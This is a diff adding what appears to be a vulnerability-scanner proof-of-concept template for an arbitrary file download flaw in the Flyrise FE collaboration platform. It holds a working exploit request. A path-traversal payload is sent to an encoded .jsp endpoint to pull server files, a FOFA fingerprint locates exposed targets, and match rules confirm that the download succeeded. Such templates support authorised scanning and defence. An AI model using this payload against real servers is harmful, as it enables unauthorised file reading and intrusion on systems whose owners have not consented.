@@ -1,0 +1,25 @@
+id: poc-yaml-flyrise-enterprise-downloadfiles-jsp-anyfile-download
+info:
+  name: 飞企互联FE业务协作平台 downLoadFiles.jsp 任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: FE业务协作平台
+  fofa: body="flyrise.stopBackspace.js"
+requests:
+- method: POST
+  path: /system/mediafile/downLoadFiles.js%70
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: path=..%2F..%2Fjboss%2Fweb%2Ffe.war%2Fsystem/mediafile/downLoadFiles.jsp&msVal=2222222222%2C
+  expression: 'status_code == 200 &&
+
+    contains(body,"downLoadFiles.jspPK") &&
+
+    contains(headers,"attachment;filename=") &&
+
+    contains(content_type,"application/octet-stream")
+
+    '
+variables: {}
+transport: http
